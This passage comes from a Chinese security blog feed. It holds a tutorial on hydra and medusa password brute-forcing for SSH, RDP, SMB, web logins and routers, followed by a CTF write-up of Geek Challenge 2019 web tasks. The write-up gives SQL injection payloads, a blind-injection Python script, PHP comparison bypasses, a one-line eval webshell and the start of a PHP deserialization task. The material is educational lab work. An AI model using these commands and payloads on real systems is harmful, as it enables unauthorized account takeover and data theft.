3:5:aA1 -y</td><td>生成的密码字典长度为3到5位，且只由’a A 1’这三种字符组成</td></tr><tr><td>-x 3:5:aA1.-+#</td><td>生成的密码字典长度为3到8位，由大小写字母+数字+.-+#进行组合。</td></tr></tbody></table><h5 id="Hydra案例"><a href="#Hydra案例" class="headerlink" title="Hydra案例"></a>Hydra案例</h5><h6 id="暴破ssh登录密码"><a href="#暴破ssh登录密码" class="headerlink" title="暴破ssh登录密码"></a>暴破ssh登录密码</h6><p>为了测试方便，我们创建两个简单的字典文件</p><p>根据命令参数，组织参数格式如下：</p><pre class="language-ruby" data-language="ruby"><code class="language-ruby">root<span class="token variable">@kali</span><span class="token operator">:</span><span class="token operator">/</span>mnt<span class="token comment"># hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh</span></code></pre><h6 id="FTP协议破解"><a href="#FTP协议破解" class="headerlink" title="FTP协议破解"></a>FTP协议破解</h6><pre class="language-css" data-language="css"><code class="language-css">破解ftp：hydra -L 用户名字典 -P 密码字典 -t 6 -e ns IP地址 -v</code></pre><h6 id="http协议破解"><a href="#http协议破解" class="headerlink" title="http协议破解"></a>http协议破解</h6><pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">get</span>方式提交，破解web登录：hydra <span class="token operator">-</span>L 用户名字典 <span class="token operator">-</span>P 密码字典 <span class="token operator">-</span>t 线程 <span class="token operator">-</span>v <span class="token operator">-</span>e ns IP地址 http<span class="token operator">-</span><span class="token keyword">get</span> <span class="token operator">/</span>admin<span class="token operator">/</span>hydra <span class="token operator">-</span>L 用户名字典 <span class="token operator">-</span>P 密码字典 <span class="token operator">-</span>t 线程 <span class="token operator">-</span>v <span class="token operator">-</span>e ns <span class="token operator">-</span>f IP地址 http<span class="token operator">-</span><span class="token keyword">get</span> <span class="token operator">/</span>admin<span class="token operator">/</span>index<span class="token punctuation">.</span>phppost方式提交，破解web登录：hydra <span class="token operator">-</span>f <span class="token operator">-</span>l 用户名 <span class="token operator">-</span>P 密码字典 <span class="token operator">-</span>V <span class="token operator">-</span>s <span class="token number">9900</span> IP地址 http<span class="token operator">-</span>post<span class="token operator">-</span>form <span class="token string">"/admin/index.php?action=login:user=USER&amp;pw=PASS:"</span><span class="token preprocessor property">#/index.php …这个是登录的 url</span><span class="token preprocessor property">#后门是POST的数据 其中的用户名密码使用 USER PASS 来代替</span><span class="token preprocessor property">#然后是如果登录出错 会出现的字符 。。。然后开始破解</span></code></pre><h6 id="https协议破解"><a href="#https协议破解" class="headerlink" title="https协议破解"></a>https协议破解</h6><pre class="language-bash" data-language="bash"><code class="language-bash">破解httpshydra <span class="token parameter variable">-m</span> /index.php <span class="token parameter variable">-l</span> 用户名 <span class="token parameter variable">-P</span> 密码字典.txt IP地址 https</code></pre><h6 id="路由器破解"><a href="#路由器破解" class="headerlink" title="路由器破解"></a>路由器破解</h6><pre class="language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-x</span> <span class="token number">6</span>:10:1a.~<span class="token operator">!</span>@<span class="token comment">#$%^&amp;()-= -t 8 192.168.1.1 http-get /</span><span class="token parameter variable">-l</span> admin 为尝试破解的用户名。<span class="token comment"># -x 6:10:1a. 表示枚举的密码由 数字、小写字母和单字符’.'等等组成，长度为 6 - 10 位。-t 8 表示分 8 个并行任务进行爆破尝试。192.168.1.1 为 Router 地址。http-get 为破解方式（协议）</span></code></pre><h6 id="http-proxy协议破解"><a href="#http-proxy协议破解" class="headerlink" title="http-proxy协议破解"></a>http-proxy协议破解</h6><pre class="language-cpp" data-language="cpp"><code class="language-cpp">破解http<span class="token operator">-</span>proxy：hydra <span class="token operator">-</span>l admin <span class="token operator">-</span>P 字典<span class="token punctuation">.</span>txt http<span class="token operator">-</span>proxy<span class="token operator">:</span><span class="token comment">//IP地址</span></code></pre><h6 id="smb破解"><a href="#smb破解" class="headerlink" title="smb破解"></a>smb破解</h6><pre class="language-css" data-language="css"><code class="language-css">破解smb：hydra -l 用户名字典 -P 密码字典 IP地址 smb</code></pre><h6 id="Windows远程桌面"><a href="#Windows远程桌面" class="headerlink" title="Windows远程桌面"></a>Windows远程桌面</h6><pre class="language-scss" data-language="scss"><code class="language-scss">破解<span class="token function">rdp</span><span class="token punctuation">(</span>windows远程登录<span class="token punctuation">)</span>：hydra ip地址 rdp -l administrator -P 密码字典.txt -V</code></pre><h6 id="邮箱pop3"><a href="#邮箱pop3" class="headerlink" title="邮箱pop3"></a>邮箱pop3</h6><pre class="language-css" data-language="css"><code class="language-css">破解邮箱pop3：hydra -l 用户名 -P 密码字典.txt my.pop3.mail pop3</code></pre><h6 id="telnet破解"><a href="#telnet破解" class="headerlink" title="telnet破解"></a>telnet破解</h6><pre class="language-css" data-language="css"><code class="language-css">hydra ip地址 telnet -l 用户字典.txt -P 密码字典.txt -t 32 -s 23 -e ns -f -V</code></pre><h6 id="语音通讯工具teamspeak"><a href="#语音通讯工具teamspeak" class="headerlink" title="语音通讯工具teamspeak"></a>语音通讯工具teamspeak</h6><pre class="language-css" data-language="css"><code class="language-css">hydra -l 用户名字典 -P 密码字典.txt -s 端口号 -vV ip teamspeak</code></pre><h6 id="cisco"><a href="#cisco" class="headerlink" title="cisco"></a>cisco</h6><pre class="language-css" data-language="css"><code class="language-css">hydra -P 密码字典 IP地址 ciscohydra -m cloud -P 密码字典 IP地址 cisco-enable</code></pre><h4 id="medusa-美杜莎"><a href="#medusa-美杜莎" class="headerlink" title="medusa(美杜莎)"></a>medusa(美杜莎)</h4><h5 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h5><p>Medusa(美杜莎)是一个速度快，支持大规模并行，模块化，爆破登录。可以同时对多个主机，用户或密码执行强力测试。Medusa 和 hydra 一样，同样属于在线密码破解工具。不同的是，medusa 的稳定性相较于 hydra 要好很多，但其支持模块要比 hydra 少一些。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># medusa支持一下协议</span>AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP <span class="token punctuation">(</span>NetWare<span class="token punctuation">)</span>,NNTP, PcAnywhere, POP3, PostgreSQL, rexec, RDP、rlogin, rsh, SMBNT, SMTP<span class="token punctuation">(</span>AUTH/VRFY<span class="token punctuation">)</span>, SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC、Generic Wrapper以及Web表单</code></pre><h5 id="使用语法和参数-3"><a href="#使用语法和参数-3" class="headerlink" title="使用语法和参数"></a>使用语法和参数</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用语法</span>medusa <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token parameter variable">-h</span> <span class="token operator">&lt;</span>目标主机<span class="token operator">></span> <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>用户名<span class="token operator">></span> <span class="token parameter variable">-P</span> <span class="token operator">&lt;</span>密码字典文件<span class="token operator">></span><span class="token comment"># -h 参数指定要破解的目标主机IP或域名，-u 参数指定要破解的用户名，-P 参数指定密码字典文件路径</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-h</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#目标IP</span><span class="token parameter variable">-H</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#目标主机文件</span><span class="token parameter variable">-u</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#用户名</span><span class="token parameter variable">-U</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#用户名文件</span><span class="token parameter variable">-p</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#密码;</span><span class="token parameter variable">-P</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#密码文件</span><span class="token parameter variable">-C</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#组合条目文件</span><span class="token parameter variable">-O</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#文件日志信息</span><span class="token parameter variable">-e</span> <span class="token punctuation">[</span>n/s/ns<span class="token punctuation">]</span>    <span class="token comment">#N意为空密码，S意为密码与用户名相同;指定要排除的密码，可以使用正则表达式。</span><span class="token parameter variable">-M</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#模块执行名称</span><span class="token parameter variable">-m</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#传递参数到模块</span><span class="token parameter variable">-d</span>    <span class="token comment">#显示所有的模块名称</span><span class="token parameter variable">-n</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#使用非默认端口</span><span class="token parameter variable">-s</span>    <span class="token comment">#启用SSL</span><span class="token parameter variable">-r</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#重试间隔时间，默认为3秒</span><span class="token parameter variable">-t</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#设定线程数量</span><span class="token parameter variable">-L</span>    <span class="token comment">#并行化，每个用户使用一个线程</span><span class="token parameter variable">-f</span>    <span class="token comment">#在任何主机上找到第一个账号/密码后，停止破解</span><span class="token parameter variable">-q</span>    <span class="token comment">#显示模块的使用信息</span><span class="token parameter variable">-v</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#详细级别（0-6）</span><span class="token parameter variable">-w</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#错误调试级别（0-10）</span><span class="token parameter variable">-V</span>    <span class="token comment">#显示版本</span><span class="token parameter variable">-Z</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#继续扫描上一次</span></code></pre><h5 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h5><h6 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h6><pre class="language-python" data-language="python"><code class="language-python">medusa <span class="token operator">-</span>M ssh <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.131</span> <span class="token operator">-</span>u root <span class="token operator">-</span>P <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>john<span class="token operator">/</span>password<span class="token punctuation">.</span>lst <span class="token operator">-</span>f<span class="token triple-quoted-string string">'''-h：要爆破的目标主机IP地址 192.168.56.131-l：要爆破的用户名 root-P：要爆破的密码字典 用的字典是自己弄的-M：调用模块ssh执行-f：一旦爆破成功一个就立即停止爆破'''</span></code></pre><h6 id="爆破Windows远程远程桌面协议-smbnt-3389"><a href="#爆破Windows远程远程桌面协议-smbnt-3389" class="headerlink" title="爆破Windows远程远程桌面协议(smbnt)3389"></a>爆破Windows远程远程桌面协议(smbnt)3389</h6><pre class="language-python" data-language="python"><code class="language-python">medusa <span class="token operator">-</span>M smbnt <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.132</span> <span class="token operator">-</span>u Administrator <span class="token operator">-</span>P <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>john<span class="token operator">/</span>password<span class="token punctuation">.</span>lst <span class="token operator">-</span>f<span class="token triple-quoted-string string">'''-h：要爆破的目标主机IP地址 192.168.56.132-l：要爆破的用户名 Administrator-P：要爆破的密码字典 /usr/share/john/password.lst-M：调用smbnt模块执行-f：一旦爆破成功一个就立即停止爆破'''</span></code></pre><p>Ps: 验证码爆破可以使用ddddocr和captcha-killer-modified</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019-web</title>
      <link href="/2024/08/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/"/>
      <url>/2024/08/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/</url>
      
        <content type="html"><![CDATA[<h4 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h4><p><img src="easysql.png" loading="lazy"></p><p>签到题</p><h4 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h4><p>基本没啥过滤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>a<span class="token string single-quoted-string">' union select 1,2,3%23&amp;password=111# 查表名 geekuser,l0ve1ysq1?username=a'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span><span class="token comment"># 查库名 id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>a<span class="token string single-quoted-string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>l0ve1ysq1<span class="token string single-quoted-string">'%23&amp;password=111# getFlag?username=a'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> from <span class="token string backtick-quoted-string">`l0ve1ysq1`</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span></code></pre><h4 id="BabySQL-双写绕过"><a href="#BabySQL-双写绕过" class="headerlink" title="BabySQL(双写绕过)"></a>BabySQL(双写绕过)</h4><p>登录框，尝试测试注入点</p><p><img src="babysql.png" loading="lazy"></p><p>发现报错了，并且返回的没有输入的<code>or</code>于是猜测被替换为空格了，尝试双写绕过</p><p><img src="babysql_2.png" loading="lazy"></p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>a<span class="token string">'+oorr+1=1#&amp;password=a'</span><span class="token operator">+</span>oorr<span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span></code></pre><p><img src="babysql_3.png" loading="lazy"></p><p>下来就是常规注入流程</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string single-quoted-string">' uniunionon selselectect 1,2,3%23&amp;password=111# 查表名 b4bsql,geekuser?username=admin&amp;password=111'</span> uniunionon selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> ffromrom infoorrmation_schema<span class="token operator">.</span>tables whwhereere table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment"># 查库名 id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span><span class="token string single-quoted-string">' uniunionon selselectect 1,group_concat(column_name),3 ffromrom infoorrmation_schema.columns whwhereere table_name='</span>b4bsql<span class="token string single-quoted-string">'%23# getFlag?username=admin&amp;password=111'</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>passwoorrd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> ffromrom <span class="token string backtick-quoted-string">`b4bsql`</span><span class="token operator">%</span><span class="token number">23</span></code></pre><h4 id="HardSQL-报错注入"><a href="#HardSQL-报错注入" class="headerlink" title="HardSQL(报错注入)"></a>HardSQL(报错注入)</h4><p>fuzz测试过滤了好多，主要是空格和&#x3D;被过滤了，可以用<code>()</code>绕过</p><p>em看了wp说是报错注入</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment"># 数据库 geek</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">'or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=11# 查表名 H4rDsq1?username=admin'</span><span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token operator">.</span>tables<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token function">like</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'geek'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span><span class="token comment"># 查库名 id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class="token string single-quoted-string">')),0x7e),1))%23&amp;password=11# getFlag 这里只能得到一半flag?username=admin'</span><span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`H4rDsq1`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span> <span class="token operator">?</span>username<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`H4rDsq1`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span></code></pre><h4 id="FinalSQL-1-1-1"><a href="#FinalSQL-1-1-1" class="headerlink" title="FinalSQL(1^1^1)"></a>FinalSQL(1^1^1)</h4><p><img src="finalsql.png" loading="lazy"></p><p>上面几个选项都没啥用，但是会get一个id参数</p><p>fuzz测试了一下，username括号也ban了，但是id参数有好多，但是没回显，估计是要盲注了</p><p>这里使用异或操作来进行注入，<code>1^1=0</code>,<code>0^0=0</code>,<code>1^0=1</code></p><p><code>1^1^1=1</code>  <code>1^0^1=0</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://23fa8212-e443-4df3-bf88-16bb8561a454.node5.buuoj.cn:81/search.php"</span>i <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查表名 F1naI1y,Flaaaaag</span>        <span class="token comment"># payload = "select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"</span>        <span class="token comment"># 查库名 id,username,password</span>        <span class="token comment"># payload = "select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select(group_concat(id,username,password))from(F1naI1y)"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1^(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">)^1"</span></span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Click"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>mygodcl4y_is_really_amazing<span class="token punctuation">,</span><span class="token number">2</span>welcomewelcome_to_my_blog<span class="token punctuation">,</span><span class="token number">3</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">4</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">5</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">6</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">7</span>Sycwelcom_to_Syclover<span class="token punctuation">,</span><span class="token number">8</span>finallycl4y_really_need_a_grilfriend<span class="token punctuation">,</span><span class="token number">9</span>flagflag&#123;<span class="token number">59</span>f87dfd<span class="token operator">-</span>c778<span class="token operator">-</span><span class="token number">496</span>d<span class="token operator">-</span><span class="token number">8</span>cf6<span class="token operator">-</span><span class="token number">4349</span>ce4d8e1c&#125;</code></pre><h4 id="BuyFlag-strcmp"><a href="#BuyFlag-strcmp" class="headerlink" title="BuyFlag(strcmp)"></a>BuyFlag(strcmp)</h4><p><img src="buyflag.png" loading="lazy"></p><p>看样子要改cookie</p><p>先抓个包看看</p><p><img src="buyflag_2.png" loading="lazy"></p><p>user改成1试试，发现成功</p><pre class="language-markup" data-language="markup"><code class="language-markup">you are CuiterPlease input your password!!</code></pre><p>然后源码给了提示</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!--~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) &#123;$password &#x3D; $_POST[&#39;password&#39;];if (is_numeric($password)) &#123;echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;&#125;elseif ($password &#x3D;&#x3D; 404) &#123;echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;&#125;&#125;--&gt;</code></pre><p>因为是弱比较所以发送404a即可，这样即可getFlag</p><p>提示数字长度太长了，需要修改，两种方法</p><ul><li>money&#x3D;1e9</li><li>money[]&#x3D;1 strcmp函数特性</li></ul><p><strong>strcmp</strong>函数在进行对比，如果相同返回0不相同返回非0。它是一个PHP弱类型，这个函数比较的是字符串类型，如果强行传入其他参数就会出错，出错后返回0，返回0就可以绕过直接登录了。</p><h4 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h4><p>源码有提示</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--        $cat=$_GET['cat'];        echo $cat;        if($cat=='dog')&#123;            echo 'Syc&#123;cat_cat_cat_cat&#125;';        &#125;        --></span></code></pre><p>签到题?cat&#x3D;dog</p><h4 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h4><p>源码”Secret.php”</p><pre class="language-http" data-language="http"><code class="language-http"># It doesn't come from 'https://Sycsecret.buuoj.cn'<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://Sycsecret.buuoj.cn</span></span># Please use "Syclover" browser<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Syclover</span></span># No!!! you can only read this locally!!!<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span></code></pre><h4 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h4><p>我家菜刀丢了，你能帮我找一下么</p><p>eval($_POST[“Syc”]);</p><p>直接蚁剑连接</p><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p><img src="php.png" loading="lazy"></p><p>看到提示：备份文件</p><p>扫描下载<code>www.zip</code></p><pre class="language-php" data-language="php"><code class="language-php"># index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"># class.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string 